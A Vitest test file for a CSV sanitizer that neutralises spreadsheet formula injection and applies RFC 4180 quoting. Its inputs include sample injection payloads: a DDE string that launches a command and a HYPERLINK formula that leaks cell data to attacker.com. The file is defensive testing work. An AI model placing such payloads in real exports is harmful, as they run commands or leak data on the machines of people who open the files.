import { describe, expect, it } from "vitest";
import { CsvSanitizer, sanitizeCsvValue } from "../src/services/csv-sanitizer.js";

describe("sanitizeCsvValue (ARCH §5.4)", () => {
  describe("Anti-Formula Injection Neutralization", () => {
    it("should prepend single quote when text column starts with '='", () => {
      const malicious = "=cmd|' /C calc'!A0";
      expect(sanitizeCsvValue(malicious, false)).toBe("'=cmd|' /C calc'!A0");
    });

    it("should prepend single quote when text column starts with '+'", () => {
      const malicious = "+SUM(A1:A10)";
      expect(sanitizeCsvValue(malicious, false)).toBe("'+SUM(A1:A10)");
    });

    it("should prepend single quote when text column starts with '-'", () => {
      const malicious = "-1+1";
      expect(sanitizeCsvValue(malicious, false)).toBe("'-1+1");
    });

    it("should prepend single quote when text column starts with '@'", () => {
      const malicious = "@SUM(1+1)";
      expect(sanitizeCsvValue(malicious, false)).toBe("'@SUM(1+1)");
    });

    it("should prepend single quote when text column starts with tab '\\t'", () => {
      const malicious = "\t=1+1";
      expect(sanitizeCsvValue(malicious, false)).toBe("'\t=1+1");
    });

    it("should prepend single quote and quote when text column starts with carriage return '\\r'", () => {
      const malicious = "\r=1+1";
      // Starts with \r -> prepends ' -> '\r=1+1
      // Contains \r -> RFC 4180 quotes the whole string -> "'\r=1+1"
      const result = sanitizeCsvValue(malicious, false);
      expect(result).toBe('"\x27\r=1+1"');
    });

    it("should NOT prepend single quote for numeric columns with negative or positive sign", () => {
      expect(sanitizeCsvValue(-42, true)).toBe("-42");
      expect(sanitizeCsvValue("+100", true)).toBe("+100");
      expect(sanitizeCsvValue(200, true)).toBe("200");
      expect(sanitizeCsvValue(0, true)).toBe("0");
    });
  });

  describe("RFC 4180 Quoting & Escaping", () => {
    it("should escape double quotes and wrap in quotes", () => {
      const value = 'Monitor "Alpha" High Priority';
      expect(sanitizeCsvValue(value)).toBe('"Monitor ""Alpha"" High Priority"');
    });

    it("should wrap values containing commas in quotes", () => {
      const value = "Error, timeout reached, connection aborted";
      expect(sanitizeCsvValue(value)).toBe('"Error, timeout reached, connection aborted"');
    });

    it("should wrap values containing newlines in quotes", () => {
      const value = "Line 1\nLine 2";
      expect(sanitizeCsvValue(value)).toBe('"Line 1\nLine 2"');
    });

    it("should wrap values containing carriage return in quotes", () => {
      const value = "First\r\nSecond";
      expect(sanitizeCsvValue(value)).toBe('"First\r\nSecond"');
    });

    it("should handle formula injection combined with quotes and commas", () => {
      const malicious = '=HYPERLINK("http://attacker.com?leak=" & A1, "Click Here")';
      const sanitized = sanitizeCsvValue(malicious, false);
      // Starts with = -> prepend ' -> '=HYPERLINK("http://attacker.com?leak=" & A1, "Click Here")
      // Contains " and , -> RFC 4180 quotes and doubles quotes
      expect(sanitized).toBe(`"'=HYPERLINK(""http://attacker.com?leak="" & A1, ""Click Here"")"`);
    });
  });

  describe("Null, Undefined, and Standard Values", () => {
    it("should return empty string for null and undefined", () => {
      expect(sanitizeCsvValue(null)).toBe("");
      expect(sanitizeCsvValue(undefined)).toBe("");
    });

    it("should return clean string unchanged for standard alphanumeric content", () => {
      expect(sanitizeCsvValue("Production API Gateway")).toBe("Production API Gateway");
      expect(sanitizeCsvValue(200, true)).toBe("200");
      expect(sanitizeCsvValue("UP")).toBe("UP");
      expect(sanitizeCsvValue("RESOLVED")).toBe("RESOLVED");
    });

    it("should work via CsvSanitizer object helper", () => {
      expect(CsvSanitizer.sanitize("=1+1", false)).toBe("'=1+1");
    });
  });
});
